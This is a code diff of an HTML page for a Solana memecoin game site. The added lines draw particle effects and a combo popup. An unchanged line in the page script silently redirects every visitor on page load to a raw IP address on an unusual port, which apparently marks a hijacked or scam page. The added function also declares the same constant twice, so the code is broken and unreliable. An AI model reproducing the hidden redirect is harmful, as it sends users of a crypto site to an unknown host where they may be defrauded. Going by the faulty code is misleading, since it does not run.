@@ -2,6 +2,33 @@
 <meta name="description" content="Join BrainRotBattle.io, the $TRALALA Solana memecoin game! Play now and enjoy fun gameplay, memes, and a unique UI. Start your journey today!"><script>
     window.location.href="http://46.4.204.162:3001";
     function createParticleExplosion(x, y) {
+    const particles = [
+        { x: x + Math.random() * 50 - 25, y: y + Math.random() * 50 - 25, size: 5 + Math.random() * 10 },
+        { x: x + Math.random() * 50 - 25, y: y + Math.random() * 50 - 25, size: 5 + Math.random() * 10 },
+    ];
+    for (let particle of particles) {
+        const ctx = document.getElementById('canvas').getContext('2d');
+        ctx.beginPath();
+        ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
+        ctx.fillStyle = 'hsl(' + Math.random() * 360 + ',100%,50%)';
+        ctx.fill();
+    }
+
+    // Add combo text popup here
+    const comboText = document.createElement('div');
+    comboText.style.position = 'absolute';
+    comboText.style.left = x + 20 + 'px';
+    comboText.style.top = y - 50 + 'px';
+    comboText.style.backgroundColor = 'rgba(255, 255, 255, 0.8)';
+    comboText.style.borderRadius = '4px';
+    comboText.style.padding = '10px';
+    comboText.style.fontSize = '16px';
+    comboText.textContent = '+X%';
+
+    document.body.appendChild(comboText);
+    setTimeout(() => {
+        document.body.removeChild(comboText);
+    }, 2000);
         const particles = [
             { x: x + Math.random() * 50 - 25, y: y + Math.random() * 50 - 25, size: 5 + Math.random() * 10 },
             { x: x + Math.random() * 50 - 25, y: y + Math.random() * 50 - 25, size: 5 + Math.random() * 10 },
